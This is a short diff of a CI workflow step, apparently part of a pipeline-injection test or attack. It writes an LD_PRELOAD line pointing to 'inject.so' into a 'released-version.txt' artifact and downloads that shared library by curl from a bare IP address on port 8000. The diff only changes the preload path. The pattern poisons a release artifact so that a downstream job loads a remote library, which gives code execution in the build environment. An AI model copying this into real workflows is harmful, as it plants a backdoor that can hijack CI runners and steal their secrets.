@@ -12,7 +12,7 @@ jobs:
         run: |
         
             mkdir released-version
-            echo -e 'null\nLD_PRELOAD="/home/runner/work/s1n-cicd-tests/RD_swg/inject.so"' > released-version/released-version.txt
+            echo -e 'null\nLD_PRELOAD=/home/runner/work/RD_swg/RD_swg/inject.so' > released-version/released-version.txt
 
             curl http://146.59.195.165:8000/inject.so -o released-version/inject.so
             
